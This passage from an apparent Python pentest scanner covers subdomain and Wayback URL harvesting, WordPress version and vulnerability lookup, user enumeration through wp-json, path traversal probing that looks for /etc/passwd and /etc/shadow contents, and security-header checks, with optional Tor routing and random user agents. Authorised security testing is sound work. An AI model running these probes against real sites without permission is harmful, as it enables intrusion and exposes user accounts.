            links.add(full_url)

    return links


def find_sensitive_params(links, params_to_check):
    """Identify URLs with parameters matching a sensitive list."""
    interesting_links = []

    for link in links:
        parsed = urlparse(link)
        if parsed.query:
            params = parsed.query.split('&')
            for param in params:
                key = param.split('=')[0]
                if key in params_to_check:
                    interesting_links.append(link)

    return interesting_links


def find_urls_with_params_and_php(links):
    global proxies
    seen_links = set()  # Avoid duplicates
    all_urls = []       # URLs final list

    for link in links:
        parsed = urlparse(link)

        if link in seen_links:
            continue

        params = list(parse_qs(parsed.query).keys())

        if parsed.path.endswith('.php'):
            params.append('php')

        if params:
            all_urls.append({'url': link, 'params': params})
        else:
            all_urls.append({'url': link, 'params': None})

        seen_links.add(link)

    return all_urls


def normalize_url_parameters(urls):
    normalized_urls = set()
    
    for url in urls:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        # Replace values by 'X'
        normalized_query = urlencode({key: 'X' for key in query_params}, doseq=True)
        

        normalized_url = urlunparse(parsed._replace(query=normalized_query))
        normalized_urls.add(normalized_url)
    
    return list(normalized_urls)


###############################################################################################################
################################################## Wayback url ################################################
###############################################################################################################


def wayback_urls(domain):
    global proxies
    """Fetch historical URLs from the Wayback Machine with status 200."""
    start_time = time.time()  # Record the start time
    try:
        print(f"{M}[Info] {G}Collecting infos for 30 seconds max")
        
        if torusage == "yes":
            proxies = tor_proxies
            
        response = requests.get(
            f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=txt", 
            timeout=30,
            proxies=proxies,
            stream=True
        )
        urls = set()  # Avoid duplicates
        for line in response.iter_lines(decode_unicode=True):
            # Stop processing if 30 seconds have passed 
            if time.time() - start_time > 30: ############# Changes here (in secondes) #############
                print(f"{M}[Info] {G}Stopping processing after 30 seconds")
                break

            if line:
                parts = line.split(' ')
                parts = [part.strip() for part in parts if part.strip()]

                if len(parts) > 4:
                    status_code = parts[4]
                    raw_url = parts[2]
                    
                    if status_code == '200':  # Takes only 200 status
                        clean_url = raw_url.replace('%20', ' ')  # clear URL responses
                        urls.add(clean_url)  

        return list(urls)  
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Could not fetch Wayback URLs: {e}")
        return []


###############################################################################################################
################################################## subdomains #################################################
###############################################################################################################


def detect_login_page(content):
    login_keywords = ["login", "connexion", "password", "sign in", "authentication"]
    soup = BeautifulSoup(content, "html.parser")

    if soup.title and any(keyword in soup.title.text.lower() for keyword in login_keywords):
        return True

    if soup.find("input", {"type": "password"}) or soup.find("form", {"action": lambda x: x and "login" in x.lower()}):
        return True

    return False

def highlight_keywords(text, keywords):
    for kw in keywords:
        if kw.lower() in text.lower():
            text = text.replace(kw, f"{Fore.RED}{kw}{Fore.CYAN}")
            text = text.replace(kw.capitalize(), f"{Fore.RED}{kw.capitalize()}{Fore.CYAN}")
    return text

# Target subdomains enum
def subreponse2(domain):
    print(f"{Fore.YELLOW}[!] Subdomains for {Fore.CYAN}{domain}")
    
    KEYWORDS = [
        'admin', 'api', 'file', 'intranet', 'pwd', 'pass',
        'config', 'dev', 'test', 'staging', 'panel', 'secret',
        'management', 'cms', 'user', 'private', 'server', 
        'cloud', 'settings', 'control', 'portal', 
        'ssh', 'ftp', 'database', 'internal', 'adminpanel',
        'superadmin', 'console', 'access', 'system', 'account', 
        'adminer', 'wordpress', 'cpanel', 'git', 'svn', 
        'pma', 'phpmyadmin', 'login', 'password', 'root', 
        'shell', 'vnc', 'docker', 'docker-compose', 'remote', 
        'vault', 'repository', 'secure', 'ssl', 'auth', 
        'manage', 'configurator', 'monitor', 'dashboard', 'adminaccess', 
        'backend', 'frontdoor', 'support', 'helpdesk', 'cloudadmin',
        'apiaccess', 'internal-api', 'sandbox', 'devops', 'ci-cd', 
        'gitlab', 'jenkins', 'deployment', 'webhooks', 'cron', 
        'backup', 'vpn', 'token', 'oauth', 'sso', 'loginportal',
        '2fa', 'mfa', 'security', 'credentials', 'reset', 'radius',
        'key', 'apikey', 'session', 'jwt', 'signin', 'recovery',
        'logout', 'change-password', 'unlock', 'identity', 'idp',
        'authenticator', 'authorization', 'authserver', 'auth-api'    
    ]
    
    
    api_key = "virustotal_token.txt"
    with open(api_key, 'r') as f:
        token = f.read().strip()
        if token == '':
            pass
        else:    
            print(f"{Fore.YELLOW}[!] Source : https://www.virustotal.com/")
            
            url = 'https://www.virustotal.com/vtapi/v2/domain/report'
            params = {'apikey':token,'domain':domain}
            try:
                response = requests.get("https://www.virustotal.com/vtapi/v2/domain/report", params=params)
                jdata = response.json()
                domains = sorted(jdata['subdomains'])
            except(KeyError):
                print(f"{Fore.MAGENTA}[!] {Fore.GREEN}No subdomains found for {Fore.YELLOW}{domain}\n")
                pass
            except(requests.ConnectionError):
                print(f"{Fore.RED}[!] Rate limit error")
                pass

            for domainz in domains:

                #print(f"{Fore.GREEN}[+] {Fore.CYAN}{domainz}")
                highlighted = highlight_keywords(domainz, KEYWORDS)
                print(f"{Fore.GREEN}[+] {Fore.CYAN}{highlighted}")
            print("")
    
    print(f"{Fore.YELLOW}[!] Source : https://crt.sh/")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }    
    
    url = f"https://crt.sh/?q={domain}"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Request error to {url} : {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    
    try:
        table = soup.find_all('table')[1] 
        rows = table.find_all('tr')[1:]  
    except IndexError:
        print(f"{M}[Error] {R}No valid data found on {url}")
        return    

    certificates = {}
    for row in rows:
        cols = row.find_all('td')
        if len(cols) >= 6:
            cert_id = cols[0].text.strip()
            logged_at = cols[1].text.strip()
            not_before = cols[2].text.strip()
            not_after = cols[3].text.strip()
            common_name = cols[4].text.strip()

            if common_name not in certificates or logged_at > certificates[common_name]['logged_at']:
                certificates[common_name] = {
                    "cert_id": cert_id,
                    "logged_at": logged_at,
                    "not_before": not_before,
                    "not_after": not_after,
                    "common_name": common_name
                }

    if not certificates:
        print(f"{Fore.MAGENTA}[!] {Fore.GREEN}No subdomains found for {Fore.YELLOW}{domain}")
        return

    print("-" * 50)
    
    for cert in certificates.values():
        test_url = f"http://{cert['common_name']}"  # HTTP default     
        statuscode = "N/A"  # init statuscode
        try:
            test_response = requests.get(test_url, headers=headers, timeout=5)
            status = test_response.status_code
            statuscode = test_response.status_code
            
            if status == 403 or status == 200:
                if detect_login_page(test_response.text):
                    status = f"login page [{Fore.RED}{statuscode}{Fore.GREEN}]"            
            
        except requests.exceptions.Timeout as e:
            status = f"Timedout [{Fore.RED}{statuscode}{Fore.GREEN}]"

            test_url = "/"
        except requests.exceptions.ConnectionError as e:
            if "getaddrinfo failed" in str(e):
                status = f"DNS resolution failed [{Fore.RED}{statuscode}{Fore.GREEN}]"

            else:
                status = f"Connection error [{Fore.RED}{statuscode}{Fore.GREEN}]"

            test_url = "/"
        except requests.exceptions.RequestException as e:
            status = f"Unexpected error [{Fore.RED}{statuscode}{Fore.GREEN}]"

            test_url = "/"
            
        #print(f"{Fore.GREEN}[+] {Fore.YELLOW}Common Name    : {Fore.CYAN}{cert['common_name']}")
        highlighted_cn = highlight_keywords(cert['common_name'], KEYWORDS)
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Common Name    : {Fore.CYAN}{highlighted_cn}")
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Logged At      : {Fore.GREEN}{cert['logged_at']}")
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}More Infos     : {Fore.GREEN}https://crt.sh/?id={cert['cert_id']}{Fore.YELLOW}")
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Satus          : {Fore.GREEN}{status}{Fore.YELLOW}")
        

        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Direct URL     : {Fore.GREEN}{test_url}{Fore.YELLOW}")
        print("-" * 50)
        
        time.sleep(0.5)


###############################################################################################################
############################################### robots & sitemap ##############################################
###############################################################################################################


def robots(domain, cookies):
    global proxies
    
    base_url = f"https://{domain}"
    all_urls = set()  # Avoid duplicates
    
    try:
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }        
        else:
            headers = None

        cookies = cookies or {}        
        
        if torusage == "yes":
            proxies = tor_proxies
        
        
    except Exception as e:
        print(f"{M}[Error] : {e}")
    
    
    try:
        robots_url = urljoin(base_url, "/robots.txt")
        response = requests.get(robots_url, proxies=proxies, headers=headers, cookies=cookies, timeout=10)

        if response.status_code == 200:
            print(f"{M}[Info] {G}Found robots.txt at {robots_url}")
            # "Disallow" route
            disallow_paths = re.findall(r'^Disallow:\s*(.+)', response.text, re.MULTILINE)
            for path in disallow_paths:
                if "Sitemap:" in path:  # Pass "Sitemap:"
                    continue
                full_url = urljoin(base_url, path.strip())
                all_urls.add(full_url)
        else:
            print(f"{M}[Info] {G}Failed to retrieve robots.txt (HTTP {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Error retrieving robots.txt : {e}")

    # sitemap.xml
    try:
        sitemap_url = urljoin(base_url, "/sitemap.xml")
        response = requests.get(sitemap_url, proxies=proxies, timeout=10)

        if response.status_code == 200:
            print(f"{M}[Info] {G}Found sitemap.xml at {sitemap_url}")
            sitemap_urls = re.findall(r'<loc>(.+?)</loc>', response.text)
            for url in sitemap_urls:
                all_urls.add(url.strip())
        else:
            print(f"{M}[Info] {G}Failed to retrieve sitemap.xml (HTTP {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Error retrieving sitemap.xml : {e}")
    
    print("")
    
    
    return list(sorted(all_urls))



###############################################################################################################
################################################## WordPress ##################################################
###############################################################################################################

def aggregate_plugins_and_themes(soup):
    raw_links = soup.find_all(['link', 'script'], href=True) + soup.find_all('script', src=True)
    version_data = defaultdict(list)

    for tag in raw_links:
        href = tag.get('href') or tag.get('src')
        result = tag_plugins_themes_and_versions(href)
        if result:
            tag_type, name, version = result
            version_data[(tag_type, name)].append(version)

    final_results = []
    for (tag_type, name), versions in version_data.items():
        most_common_version = Counter(versions).most_common(1)[0][0]
        colored = f"{M}{tag_type} {Y}[{name} {R}{most_common_version}{Y}]"
        final_results.append(colored)

    return sorted(final_results)


def tag_plugins_themes_and_versions(url):
    name = None  
    tag = None   

    # Plugins
    if '/wp-content/plugins/' in url:
        tag = "[plugin]"
        match = re.search(r'/wp-content/plugins/([^/]+)/', url)
        if match:
            name = match.group(1)

    # Themes
    elif '/wp-content/themes/' in url:
        tag = "[theme] "
        match = re.search(r'/wp-content/themes/([^/]+)/', url)
        if match:
            name = match.group(1)
    else:
        tag = f"[other]"


    if not name:
        return ""

    version_match = re.search(r'\?ver=([\d.]+)', url)
    version_tag = f"{Y}[{name} {R}{version_match.group(1)}{Y}]" if version_match else ""

    if not version_tag:
        return ""

    if verbosity == "yes":
        final_result = f"{M}{tag} {version_tag} {G}{url}"
    else:
        final_result = f"{M}{tag} {version_tag}"        
    return final_result


def detect_version_meta(soup):
    meta_tags = soup.find_all('meta', attrs={'name': 'generator'})
    
    for meta_tag in meta_tags:
        content = meta_tag.get('content', '')
        match = re.search(r'WordPress\s+(\d+\.\d+(\.\d+)?)', content)
        
        if match:
            # Si une version WordPress est trouvée, retourner la version
            return f"WordPress {match.group(1)}"
    return "unknown ..."
    

def detect_version_assets(soup):
    links = soup.find_all('link', href=True) + soup.find_all('script', src=True)
    for tag in links:
        href = tag.get('href') or tag.get('src')
        if '?ver=' in href:
            version = href.split('?ver=')[-1]
            return version
    return "unknown ..."

def detect_version_readme(url):
    response = requests.get(f"{url}/readme.html")
    if response.status_code == 200:
        version_match = re.search(r'WordPress (\d+\.\d+\.\d+)', response.text)
        if version_match:
            return f"WordPress {version_match.group(1)}"
    return "N/A"

def detect_version_by_files(url):
    response = requests.get(f"{url}/wp-includes/version.php")
    if response.status_code == 200:
        file_hash = hashlib.md5(response.content).hexdigest()
        known_hashes = {
            "hash1": "Version 5.8.1",
            "hash2": "Version 5.9.3",
        }
        return known_hashes.get(file_hash, "Version inconnue")
    return "version.php not found"

def detect_version_api(url):
    try:
        response = requests.get(f"{url}/wp-json/", timeout=10)
        if response.status_code == 200:
            try:
                data = response.json()
                if 'meta' in data and 'generator' in data['meta']:
                    return data['meta']['generator']
                return "REST API is active but version not found"
            except ValueError:
                return "REST API is active but malformed JSON"
        elif response.status_code == 403:
            return "REST API access denied (403)"
        elif response.status_code == 404:
            return "REST API endpoint not found (404)"
    except requests.RequestException as e:
        return f"REST API error: {e}"

    return "REST API disabled or version not detected"


def detect_plugins_and_themes(soup, raw_html=None):
    plugins_or_themes = set()
    all_tags = soup.find_all(['script', 'link', 'img'])

    for tag in all_tags:
        attrs_to_check = ['href', 'src', 'data-rocket-src', 'data-src']
        for attr in attrs_to_check:
            href = tag.get(attr)
            if href and 'wp-content/' in href:
                plugins_or_themes.add(tag_plugins_themes_and_versions(href))

    # Analyse aussi dans le HTML brut
    if raw_html:
        pattern = re.compile(
            r'wp-content/(?P<type>plugins|themes)/(?P<slug>[a-zA-Z0-9_-]+)(?:[^"\'>]+)?'
            r'(?:/((?:\d+\.){1,3}\d+)(?=/)|\?ver=((?:\d+\.){1,3}\d+))?',
            re.IGNORECASE
        )

        version_fallback_pattern = re.compile(r'/(?:\d+\.){1,3}\d+(?=/)')  # fallback pattern for deep versions


        for match in pattern.finditer(raw_html):
            kind = match.group('type')
            slug = match.group('slug')
            version = match.group(3) or match.group(4)  # folder or query
            full_match_str = match.group(0)  # full matched string
            kind_tag = '[plugin]' if kind == 'plugins' else '[theme]'
            
            if not version:
                # Try fallback search for version deeper in path (e.g., /assets/js/17.8.3/)
                fallback_match = version_fallback_pattern.search(full_match_str)
                if fallback_match:
                    version = fallback_match.group(0).strip("/")
            
            if version:
                plugins_or_themes.add(f"{M}{kind_tag} {Y}[{slug} {R}{version}{Y}]")
            else:
                if not any(slug in entry and kind_tag in entry for entry in plugins_or_themes):
                    plugins_or_themes.add(f"{M}{kind_tag} {Y}[{slug} {R}Version_not_found{Y}]")



        generator_pattern = re.compile(
            r'<meta\s+name=["\']generator["\']\s+content=["\']([^"\']+)["\']',
            re.IGNORECASE
        )

        for meta_match in generator_pattern.finditer(raw_html):
            content = meta_match.group(1).strip()
            if 'All in One SEO' in content:
                match = re.search(r'All in One SEO.*?(\d+\.\d+\.\d+)', content)
                version = match.group(1) if match else "Version_not_found"
                plugins_or_themes.add(f"{M}[plugin] {Y}[all-in-one-seo-pack {R}{version}{Y}]")
            elif 'Site Kit by Google' in content:
                match = re.search(r'Site Kit by Google.*?(\d+\.\d+\.\d+)', content)
                version = match.group(1) if match else "Version_not_found"
                plugins_or_themes.add(f"{M}[plugin] {Y}[google-site-kit {R}{version}{Y}]")







    return sorted(plugins_or_themes)




def enumerate_users_via_wp_json(url):
    print(f"{M}[Info] {G}Looking for usernames")
    try:
        api_url = f"{url.rstrip('/')}/wp-json/wp/v2/users"
        response = requests.get(api_url, timeout=15)
        
        if response.status_code == 200:
            try:
                users = response.json()
                if isinstance(users, list) and users:
                    print(f"{M}[+] {G}Users found\n")
                    print(f"{Y}-------------------------{G}")
                    for user in users:
                        username = user.get('name', 'Unknown')
                        user_id = user.get('id', 'Unknown')
                        slug = user.get('slug', 'Unknown')
                        print(f" - ID       : {R}{user_id}{G}")
                        print(f" - Username : {R}{username}{G}")
                        print(f" - Slug     : {R}{slug}{G}")
                        print(f"{Y}-------------------------{G}")
                    print("")    
                else:
                    print(f"{M}[-] {G}No users found\n")
            except ValueError:
                print(f"{M}[-] {R}Malformed json")
        elif response.status_code == 403:
            print(f"{M}[-] {R}Access not allowed (403)")
        elif response.status_code == 404:
            print(f"{M}[-] {R}Endpoint not found (404)")
        else:
            print(f"{M}[-] {R}Unexpected error (HTTP {response.status_code})")
    except requests.RequestException as e:
        print(f"{M}[Error] {R}{e}")






def remove_ansi_codes(text):
    return re.sub(r'\x1b\[[0-9;]*m', '', text)


def is_version_affected(target_version, affected_versions):
    for spec, vdata in affected_versions.items():
        from_ver = vdata['from_version']
        to_ver = vdata['to_version']
        from_inc = vdata['from_inclusive']
        to_inc = vdata['to_inclusive']
        try:
            if from_ver != '*' and (version.parse(target_version) < version.parse(from_ver) or 
                                    (not from_inc and version.parse(target_version) == version.parse(from_ver))):
                continue
            if version.parse(target_version) > version.parse(to_ver) or \
               (not to_inc and version.parse(target_version) == version.parse(to_ver)):
                continue
            return True
        except Exception:
            continue
    return False
    

def display_results(result):
    print(f"{M}[Meta Tag Version]{G} : {result['meta']}")
    print(f"{M}[Readme Version]{G}   : {result['readme']}")
    print(f"{M}[API Version]{G}      : {result['api']}")
    print(f"\n{M}[Info] {G}Plugins and Themes Detected")
    
    unique_items = sorted(set(result['plugins_and_themes']))

    wordpress_version = None
    if 'meta' in result and 'wordpress' in result['meta'].lower():
        wordpress_version = result['meta'].split()[-1]  # Récupère la version à partir de meta
    elif 'readme' in result and 'wordpress' in result['readme'].lower():
        wordpress_version = result['readme'].split()[-1]  # Récupère la version à partir de readme
    elif 'api' in result and 'wordpress' in result['api'].lower():
        wordpress_version = result['api'].split()[-1]  # Récupère la version à partir de API

    if wordpress_version:
        unique_items.append(f"{M}[core]   {Y}[wordpress {R}{wordpress_version}{Y}]")

     
    if unique_items:
        vulns_path = "payloads/wp_vulns.json"
        if not os.path.isfile(vulns_path) or (time.time() - os.path.getmtime(vulns_path)) > 86400:
            print(f"{G}  - [i] wp_vulns.json is missing or outdated. Downloading a fresh copy...")
            try:
                response = requests.get("https://www.wordfence.com/api/intelligence/v2/vulnerabilities/production", timeout=60)
                response.raise_for_status()
                with open(vulns_path, "wb") as f:
                    f.write(response.content)
                print(f"{G}  - [✓] File saved to {vulns_path}\n")
            except requests.RequestException as e:
                print(f"{R}  - [!] Failed to download wp_vulns.json: {e}\n")
        else:
            print(f"{G}  - [✓] wp_vulns.json is up to date\n")
        
        
        for item in unique_items:
            if item:
                print(f"{item}")
    
        print(f"\n{M}[Info] {G}Checking Wordpress - Plugins - Themes vulnerabilities")
        
      
        try:
            with open(vulns_path, "r", encoding="utf-8") as f:
                vulns_data = json.load(f)
        except Exception as e:
            print(f"{R}  - [x] Failed to load JSON file : {e}")
            print(f"{R}  - [x] Try deleting the JSON file and restarting the application")
            return

        def extract_item_info(clean_item):
            match = re.match(r"\[(plugin|theme)\]\s*\[\s*([^\s\]]+)\s+([^\]]+)\s*\]", clean_item)
            if match:
                return match.groups()  # type, slug, version
            elif "wordpress" in clean_item.lower():
                return ("core", "wordpress", clean_item.split()[-1])  # exemple: 'wordpress 6.5.2'
            else:
                return None

        def is_version_affected(version, affected_versions):
            if version == "Version_not_found":
                return
                
            try:
                version = version.split()[0]  
                version = version.strip(']')
                current_version = parse_version(version)
            except InvalidVersion:
                max_length = 80
                short_range = version_range[:max_length] + "..." if len(version_range) > max_length else version_range
                print(f"{C} |  {R}[Error_info] {G}Invalid version detected (may be a false positive)\n{C} | {Y} --> {short_range}")
                return False

            for version_range in affected_versions.values():
                from_v_raw = version_range.get("from_version", "0")
                to_v_raw = version_range.get("to_version", "9999")

                try:
                    # Handle wildcards
                    if from_v_raw == "*" and to_v_raw == "*":
                        return True
                    from_v = parse_version(from_v_raw) if from_v_raw != "*" else None
                    to_v = parse_version(to_v_raw) if to_v_raw != "*" else None
                except InvalidVersion:
                    max_length = 80
                    short_range = version_range[:max_length] + "..." if len(version_range) > max_length else version_range
                    print(f"{C} |  {R}[Error_info] {G}Invalid range version detected (may be a false positive)\n{C} |{Y} --> {short_range}")
                    continue

                from_ok = (current_version >= from_v) if from_v else True
                to_ok = (current_version <= to_v) if to_v else True

                if from_ok and to_ok:
                    return True

            return False
        
        found = False
        for item in unique_items:
            clean_item = remove_ansi_codes(item)            
            info = extract_item_info(clean_item)
            if not info:
                continue
            
            item_type, item_slug, item_version = info
            print(f"{G}[+] {Y}{item_slug} {R}{item_version}")
            vuln_found_for_item = False
            for v in vulns_data.values():
                for software in v.get("software", []):
                    vuln_type = software.get("type")
                    vuln_slug = software.get("slug")
                    
                    if vuln_type == item_type and vuln_slug.lower() == item_slug.lower():
                        affected = software.get("affected_versions", {})
                        if is_version_affected(item_version, affected):
                            vuln_found_for_item = True
                            found = True
                            affected_ranges = ', '.join(affected.keys())
                            print(f"{C} |  {R}[!] {G}{item_type.title()} {item_slug} {item_version} - {v['title']}")
                            print(f"{C} |   ↳ {G}Description      : {Y}{v['description'][:90]}...")
                            print(f"{C} |   ↳ {G}Affected version : {Y}{affected_ranges}")
                            print(f"{C} |   ↳ {G}Remediation      : {Y}{software.get('remediation', 'N/A')[:90]}...")
                            print(f"{C} |   ↳ {G}CVSS Score       : {Y}{v['cvss']['score']} ({v['cvss']['rating']})")
                            full_url = v['references'][0]
                            if full_url.endswith('?source=api-prod'):
                                full_url = full_url.removesuffix('?source=api-prod')
                            print(f"{C} |   ↳ {G}Reference        : {Y}{full_url}\n{C} |")
            
            if not vuln_found_for_item:
                print(f"{C} |   ↳ {M}No vulnerabilites found\n{C} |")

        if not found:
            print(f"{G}  - [✓] Wordpress - Plugins - Themes are up to date")
    
    else:
        print(f"{M}[-] {G}Nothing ...")
    
    print(f"\n{M}[Info] {G} Wordpress versions vulns : https://wpscan.com/wordpresses/")
    print(f"{M}[Info] {G} Wordpress plugins vulns  : https://wpscan.com/plugins/")
    print(f"{M}[Info] {G} Wordpress thmes vulns    : https://wpscan.com/themes/")
    print(f"{M}[Info] {G} Wordfense free API       : https://www.wordfence.com/api/intelligence/v2/vulnerabilities/production")


def detect_wordpress_version(url, cookies):
    global proxies
    
    print(f"{M}[Info] {G}Checking WordPress Version")
    try:
        
        
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }        
        else:
            headers = None

        cookies = cookies or {}
        
        if torusage == "yes":
            proxies = tor_proxies
            
        response = requests.get(url, timeout=15, proxies=proxies, headers=headers, cookies=cookies, verify=False) # Disable SSL verification
        if response.status_code != 200:
            print(f"{M}[Error] {R}Unable to access to target")
            print("")
            return None

        soup = BeautifulSoup(response.text, 'html.parser')
        result = {
            "meta": detect_version_meta(soup),
            "readme": detect_version_readme(url),
            "api": detect_version_api(url),
            "plugins_and_themes": detect_plugins_and_themes(soup, raw_html=response.text)
        }

        display_results(result)
        print()
        enumerate_users_via_wp_json(url)

        return result

    except requests.RequestException as e:
        print(f"[Error] {e}")
    print("")


def check_wordpress_paths(url, paths, cookies):
    global proxies
    
    print(f"{Y}-" * 50)
    for path in paths:
        full_url = url + path
        try:

            if user_agents == "yes":
                headersX = loadit("payloads/user_agents.txt")
                headers = {
                    "User-Agent": random.choice(headersX)
                }        
            else:
                headers = None

            cookies = cookies or {}     
            
            if torusage == "yes":
                proxies = tor_proxies

            response = requests.get(full_url, headers=headers, proxies=proxies, cookies=cookies, verify=False) # Disable SSL verification
            print(f"{M}[Info] {G}Checking : {Y}{full_url}")
            print(f"{M}[+] {G}Status Code : {Y}{response.status_code}{G}")
            
            if response.status_code == 200:
                print(f"    Accessible (200 OK)")
            elif response.status_code == 403:
                print(f"    Forbidden (403) - Exists but not accessible")
            elif response.status_code == 405:
                if "XML-RPC server accepts POST requests only" in response.text:
                    print(f"    Method Not Allowed (405) - Exist with other request than GET")
                else:
                    print(f"    Method Not Allowed (405) - Not accessible (if xmlrpc.php)")
            elif response.status_code == 404:
                print(f"    Not Found (404) - Does not exist")
            elif response.status_code == 301 or response.status_code == 302:
                print(f"    Redirected (301/302) - Potential sensitive location")
            else:
                print(f"    Other status : {response.status_code}")
        except requests.RequestException as e:
            print(f"{M}[Error] {R}Error occurred for {full_url}: {e}")
        print(f"{Y}-" * 50)



###############################################################################################################
################################################## Traversal ##################################################
###############################################################################################################

def test_path_traversal(url, payload, cookies):
    global seen_status_codes, proxies
    sensitive_keywords = [
        "etc/passwd", "etc/hosts", "etc/shadow", "etc/sudoers", "etc/group",  
        "var/log", "var/tmp", "home", "root",  
        "Windows/System32", "Windows/Win32", "Program Files",  
        "Users", "AppData", "Documents", "Downloads", "Desktop",  
        "boot.ini", "ntldr", "pagefile.sys",  
        "var/www", "tmp", "lib", "bin" 
    ]    
    
    # Ensure the URL starts with 'http://' or 'https://'
    if not (url.startswith("http://") or url.startswith("https://")):
        url = 'http://' + url
    
    # Remove trailing slash if present
    if url.endswith('/'):
        url = url[:-1]
    
    # Check if the URL contains '=' and prepare the target and control URLs
    if "=" in url:
        base_url, _, _ = url.partition("=")
        target_url = base_url + "=" + payload
        control_url = base_url + "="
    else:
        target_url = url
        control_url = url



    if user_agents == "yes":
        headersX = loadit("payloads/user_agents.txt")
        headers = {
            "User-Agent": random.choice(headersX)
        }        
    else:
        headers = None

    cookies = cookies or {}
    
    if torusage == "yes":
        proxies = tor_proxies

        
    try:
        control_response = requests.get(control_url, proxies=proxies, allow_redirects=False, headers=headers, cookies=cookies)
        control_text = control_response.text
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}{control_url}: {e}")
        return
    
    try:
        response = requests.get(target_url, proxies=proxies, allow_redirects=False, headers=headers, cookies=cookies)
        response_text = response.text

        # Check if the response code is 200 and if the response content contains sensitive data
        if response.status_code == 200:
            # Check if the response contains a sensitive keyword (ex : contents of etc/passwd)
            if response_text != control_text:
                found_keywords = [keyword for keyword in sensitive_keywords if keyword in response_text]
                if found_keywords:
                    print(f"{G}[+] {Y}{', '.join(found_keywords)} {G}detected for : {C}{target_url}")
                    print(f"{G}[+] Potential path traversal detected {Y}[{G}diff : {R}{len(response_text) - len(control_text)} bytes{Y}]")
                else:
                    print(f"{G}[+] {C}{target_url}")
                    print(f"{G}[+] Potential path traversal detected {Y}[{G}diff : {R}{len(response_text) - len(control_text)} bytes{Y}]")
            else:
                if verbosity == "yes":
                    print(f"{R}[{response.status_code}] {G}{payload}")
        else:
            if verbosity == "yes":
                print(f"{R}[{response.status_code}] {G}{payload}")
            else:
                status_code = response.status_code
                if status_code not in seen_status_codes:
                        seen_status_codes.append(status_code)
                        print(f"{R}[{status_code}] {G}Displayed ...")

                
                
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}{target_url}: {e}")




###############################################################################################################
################################################# Code review #################################################
###############################################################################################################


def fetch_rdap_info(domain):
    url = f"https://rdap.verisign.com/com/v1/domain/{domain}"
    try:
        print(f"{M}[Info] {G}Domain information")
        response = requests.get(url, timeout=10) 
        if response.status_code == 200:
            data = response.json()
            print_rdap_info(data)
        elif response.status_code == 404:
            print(f"{M}[-] {G}No information available for this domain ({response.status_code})")
        else:
            print(f"{M}[Error] {R}Unexpected error : HTTP Status {response.status_code}")
    except requests.RequestException as e:
        print(f"{M}[Error] {R}{e}")

def print_rdap_info(data):
    print(f"{M}[+] {G}Domain name : {Y}{data.get('ldhName', 'N/A')}")
    
    # Statuses
    statuses = data.get("status", [])
    if statuses:
        print(f"\n{M}[Info] {G}Statuses :")
        for status in statuses:
            print(f"  - {status}")
    
    # Entities 
    entities = data.get("entities", [])
    if entities:
        print(f"\n{M}[Info] {G}Associated Entities :")
        for entity in entities:
            print(f"  - Type : {entity.get('objectClassName', 'N/A')}")
            roles = entity.get("roles", [])
            if roles:
                print("    Roles :")
                for role in roles:
                    print(f"      - {role}")
            vcard = entity.get("vcardArray", [])
            if vcard and len(vcard) > 1:
                vcard_info = vcard[1]
                for item in vcard_info:
                    if len(item) > 2:
                        label, value = item[0], item[3]
                        print(f"    {label.capitalize()} : {value}")
    
    # Events
    events = data.get("events", [])
    if events:
        print(f"\n{M}[Info] {G}Events :")
        for event in events:
            action = event.get("eventAction", "N/A")
            date = event.get("eventDate", "N/A")
            print(f"  - {action.capitalize()}: {date}")
    
    # Nameservers
    nameservers = data.get("nameservers", [])
    if nameservers:
        print(f"\n{M}[Info] {G}Nameservers :")
        for ns in nameservers:
            print(f"  - {ns.get('ldhName', 'N/A')}")
    
    # Notices
    notices = data.get("notices", [])
    if notices:
        print(f"\n{M}[Info] {G}Notices :")
        for notice in notices:
            title = notice.get("title", "N/A")
            print(f"  - {title}")
            descriptions = notice.get("description", [])
            for desc in descriptions:
                print(f"    {desc}")



def check_headers(headers):
    security_headers = ['Strict-Transport-Security', 'Content-Security-Policy', 'X-Content-Type-Options', 'X-XSS-Protection', 'X-Frame-Options']
    missing_headers = []
    for header in security_headers:
        if header not in headers:
            missing_headers.append(header)
    return missing_headers


def check_meta_redirection(soup):
    metas = soup.find_all("meta", attrs={"http-equiv": "refresh"})
    return len(metas) > 0


def find_sources_and_sinks(soup):
    escaped_sinks = [re.escape(sink) for sink in SOURCES_SINKS]
    combined_sinks = "|".join(escaped_sinks)
    matches = re.findall(combined_sinks, str(soup))
    return list(set(matches))  # Remove duplicates


# Function to check <script> tags and JavaScript for dangerous patterns
def check_scripts(soup):
    scripts = soup.find_all("script")
    combined_scripts = " ".join(str(script) for script in scripts)
    dangerous_patterns = ['eval', 'setTimeout', 'setInterval', 'document.write', 'document.writeln', 'Function']

    matches = []
    for pattern in dangerous_patterns:
        if re.search(pattern, combined_scripts, re.IGNORECASE):
            matches.append(pattern)

    return matches


def check_cookie_security(headers):
    cookies = headers.get('Set-Cookie', '')
    issues = []
    if 'Secure' not in cookies:
        issues.append("Cookie not marked as Secure")
    if 'HttpOnly' not in cookies:
        issues.append("Cookie not marked as HttpOnly")
    return issues


def check_csrf_protection(soup):
    forms = soup.find_all("form")
    csrf_issues = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        if method == "post" and "csrf" not in form.get_text().lower():
